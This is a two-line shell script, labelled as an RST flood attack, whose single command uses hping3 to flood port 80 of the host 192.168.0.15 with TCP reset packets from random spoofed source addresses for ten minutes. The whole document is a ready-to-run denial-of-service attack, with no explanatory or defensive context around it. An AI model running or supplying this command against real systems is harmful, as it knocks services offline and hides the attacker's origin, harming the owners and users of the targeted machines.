# Script to do a RST Flood attack on the target machine

# Execute the RST Flood attack
timeout 10m hping3 --flood --rand-source -R -p 80 192.168.0.15

